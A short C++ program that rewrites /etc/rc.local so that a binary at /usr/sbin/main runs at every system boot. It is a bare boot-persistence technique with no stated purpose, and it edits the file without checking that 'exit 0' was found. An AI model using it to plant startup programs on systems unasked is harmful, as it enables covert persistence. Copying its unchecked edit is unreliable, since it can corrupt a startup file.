#include <string>
#include <sstream>
#include <fstream>
using namespace std;

int main(){
    ostringstream text;
    ifstream file("/etc/rc.local");
    text << file.rdbuf();
    string str = text.str();
    string str_search("exit 0");
    string str_replace("/usr/sbin/main\nexit 0");
    size_t pos = str.rfind(str_search);
    str.replace(pos, str_search.length(), str_replace);
    ofstream out("/etc/rc.local");
    out << str;
    return 0;
}
